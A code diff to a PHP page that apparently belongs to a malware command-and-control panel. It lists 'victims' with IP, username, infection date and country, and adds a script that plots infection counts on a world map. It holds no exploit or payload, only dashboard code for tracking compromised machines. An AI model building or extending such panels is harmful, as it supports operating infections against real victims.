@@ -4,7 +4,7 @@
 function getAllVictims(){
     # validate input for sql injection
     # end points should response only local requests except few of them
-    $query = "SELECT * FROM ...";
+    //$infos = file_get_contents("MIDDLEWAREXXX/dashboard/status/getallvictims");
 
     $infos = array(
         array("id"=>"11", "ip"=>"64.67.82.11", "username"=>"han", "infection_date"=>"01/11/2020 23:21", "first_touch"=> "01/11/2020 23:22", "country"=>"China"),
@@ -95,7 +95,27 @@ function createVictimTable(){
         <script src="/js/animated.js"></script>
         <script src="/js/worldLow.js"></script>
         <script src="/js/worldmap.js"></script>
-        <?php // TODO: World values?>
+        
+
+        <script>
+            //var url = "MIDDLEWAREXXX/dashboard/status/worldmap";
+            var url = "/ok.json";
+            var worldmapvalues=[];
+            var xhr = new XMLHttpRequest();
+            xhr.onreadystatechange = function() {
+                if (this.readyState == 4 && this.status == 200) {
+                // Typical action to be performed when the document is ready:
+                    var temp = JSON.parse(xhr.responseText);
+                    for( var k in temp){
+                        worldmapvalues.push({id:k,value:temp[k]});
+                    }
+                    polygonSeries.data = worldmapvalues;
+                    polygonSeries.exclude = ["AQ"];
+                }
+            };
+            xhr.open("GET", url, true);
+            xhr.send();
+        </script>
 
         
 
